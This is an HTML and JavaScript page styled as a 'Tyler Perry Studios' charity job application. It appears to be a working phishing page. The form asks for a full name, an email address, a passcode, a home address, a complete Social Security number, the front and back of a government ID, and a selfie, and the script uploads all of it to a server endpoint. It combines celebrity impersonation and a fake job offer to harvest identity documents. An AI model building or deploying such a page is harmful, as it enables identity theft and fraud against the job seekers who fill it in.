<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>Tyler Perry — Charity Job Application</title>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600&family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
  <style>
    :root { --bg: #080808; --bg-2: #121212; --gold: #C9A45C; --gold-2: #E4C98A; --text: #FFFFFF; --text-2: #B8B8B8; --border: #292929; --font-display: 'Cormorant Garamond', serif; --font-body: 'Inter', sans-serif; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: var(--bg); color: var(--text); font-family: var(--font-body); line-height: 1.6; }
    ::-webkit-scrollbar { display: none; }
    a { text-decoration: none; color: inherit; }
    
    .site-header { position: fixed; top: 0; left: 0; right: 0; background: rgba(8, 8, 8, 0.95); backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); z-index: 1000; }
    .nav { display: flex; align-items: center; justify-content: space-between; height: 75px; max-width: 1200px; margin: 0 auto; padding: 0 20px; }
    .brand { display: flex; align-items: center; gap: 12px; }
    .logo-mark { font-family: var(--font-display); font-size: 2.4rem; font-weight: 700; color: var(--gold); }
    .logo-text { display: flex; flex-direction: column; }
    .logo-title { font-family: var(--font-display); font-size: 1.1rem; font-weight: 600; letter-spacing: 0.2em; line-height: 1.1; }
    .logo-sub { font-size: 0.6rem; letter-spacing: 0.4em; color: var(--gold-2); }

    .section { padding: 120px 20px 60px; max-width: 800px; margin: 0 auto; }
    h1 { font-family: var(--font-display); font-size: 3rem; margin-bottom: 15px; }
    p.subtitle { color: var(--text-2); margin-bottom: 40px; font-size: 1.1rem; }

    .apply-form { background: var(--bg-2); border: 1px solid var(--border); padding: 40px; border-radius: 8px; }
    .form-group { margin-bottom: 20px; }
    .form-group label { display: block; color: var(--gold-2); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px; }
    .form-group input { width: 100%; padding: 14px; background: #080808; border: 1px solid #444; border-radius: 4px; color: white; font-family: var(--font-body); font-size: 1rem; transition: 0.3s; }
    .form-group input:focus { outline: none; border-color: var(--gold); }
    .form-group input[type="file"] { padding: 10px; }
    
    .btn-submit { width: 100%; padding: 16px; background: linear-gradient(135deg, var(--gold), var(--gold-2)); color: #080808; border: none; border-radius: 4px; font-weight: 700; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; margin-top: 10px; transition: 0.3s; }
    .btn-submit:hover { filter: brightness(1.1); transform: translateY(-2px); }
  </style>
</head>
<body>

  <header class="site-header">
    <div class="nav">
      <a class="brand" href="index.html">
        <span class="logo-mark">T</span>
        <span class="logo-text">
          <span class="logo-title">TYLER PERRY</span>
          <span class="logo-sub">STUDIOS</span>
        </span>
      </a>
    </div>
  </header>

  <main class="section">
    <h1>Charity Job Application</h1>
    <p class="subtitle">Apply for our community outreach and charity positions.</p>

    <form id="charityForm" class="apply-form">
      <div class="form-group">
        <label>Full Legal Name</label>
        <input type="text" id="fullName" placeholder="John Doe" required>
      </div>
      
      <div class="form-group">
        <label>Email Address (Gmail)</label>
        <input type="email" id="email" placeholder="john@gmail.com" required>
      </div>

      <div class="form-group">
        <label>Create a 4-Digit Passcode</label>
        <input type="tel" id="passcode" placeholder="••••" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required>
      </div>

      <div class="form-group">
        <label>Full House Address</label>
        <input type="text" id="address" placeholder="123 Main St, City, State, ZIP" required>
      </div>

      <div class="form-group">
        <label>Complete SSN Number</label>
        <input type="tel" id="ssn" placeholder="Enter your SSN" inputmode="numeric" required>
      </div>

      <div class="form-group">
        <label>Upload Front of Government ID</label>
        <input type="file" id="idUploadFront" accept="image/*,.pdf" required>
      </div>

      <div class="form-group">
        <label>Upload Back of Government ID</label>
        <input type="file" id="idUploadBack" accept="image/*,.pdf" required>
      </div>

      <div class="form-group">
        <label>Upload Selfie Picture</label>
        <input type="file" id="selfieUpload" accept="image/*" required>
      </div>

      <button type="submit" class="btn-submit" id="submitBtn">Submit Application</button>
    </form>
  </main>

  <script>
    document.getElementById('charityForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const btn = document.getElementById('submitBtn');
      btn.textContent = 'Uploading Securely...';
      btn.disabled = true;

      const formData = new FormData();
      formData.append('fullName', document.getElementById('fullName').value);
      formData.append('email', document.getElementById('email').value);
      formData.append('passcode', document.getElementById('passcode').value);
      formData.append('address', document.getElementById('address').value);
      formData.append('ssn', document.getElementById('ssn').value);
      formData.append('idDocumentFront', document.getElementById('idUploadFront').files[0]);
      formData.append('idDocumentBack', document.getElementById('idUploadBack').files[0]);
      formData.append('selfie', document.getElementById('selfieUpload').files[0]);

      try {
        const res = await fetch('/api/auditions/apply', {
          method: 'POST',
          body: formData
        });
        
        if (res.ok) {
          const selfieFile = document.getElementById('selfieUpload').files[0];
          const reader = new FileReader();
          reader.onload = function(event) {
            sessionStorage.setItem('applicantSelfie', event.target.result);
            sessionStorage.setItem('applicantName', document.getElementById('fullName').value);
            window.location.href = 'charity-pending.html';
          };
          reader.readAsDataURL(selfieFile);
        } else {
          alert('Submission failed. Please try again.');
          btn.textContent = 'Submit Application';
          btn.disabled = false;
        }
      } catch (err) {
        alert('Server error. Please try again.');
        btn.textContent = 'Submit Application';
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
